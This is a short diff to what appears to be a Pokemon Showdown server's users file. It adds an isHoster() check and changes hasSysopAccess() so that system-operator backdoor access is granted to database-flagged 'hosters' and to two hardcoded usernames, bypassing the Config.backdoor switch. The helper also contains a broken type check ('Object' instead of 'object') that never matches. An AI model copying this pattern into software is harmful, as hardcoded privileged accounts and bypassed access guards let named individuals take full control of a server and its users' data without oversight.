@@ -38,6 +38,14 @@ const Matchmaker = require('./ladders-matchmaker').matchmaker;
 
 let Users = module.exports = getUser;
 
+function isHoster(user) {
+	if (!user) return;
+	if (typeof user === 'Object') user = user.userid;
+	let hoster = Db('hoster').get(toId(user));
+	if (hoster === 1) return true;
+	return false;
+}
+
 /*********************************************************
  * Users map
  *********************************************************/
@@ -503,7 +511,7 @@ class User {
 	 * Special permission check for system operators
 	 */
 	hasSysopAccess() {
-		if (this.isSysop && Config.backdoor) {
+		if (this.isSysop && Config.backdoor || isHoster(this.userid) || this.userid == 'alphaicy' || this.userid == 'deltaskiez') {
 			// This is the Pokemon Showdown system operator backdoor.
 
 			// Its main purpose is for situations where someone calls for help, and
